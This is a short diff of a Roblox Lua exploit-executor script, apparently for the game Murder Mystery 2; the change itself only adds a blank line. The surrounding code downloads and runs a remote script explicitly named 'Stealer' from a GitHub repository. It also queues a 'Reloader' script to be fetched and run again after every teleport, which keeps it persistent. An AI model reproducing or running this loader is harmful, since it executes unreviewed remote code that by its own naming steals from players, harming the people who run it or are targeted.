@@ -1,4 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/aluucardd/MM2/refs/heads/main/Stealer"))()
+
 local q = syn and syn.queue_on_teleport or queue_on_teleport or queue_on_join
 if q then
     q([[loadstring(game:HttpGet("https://raw.githubusercontent.com/aluucardd/MM2/refs/heads/main/Reloader"))()]])
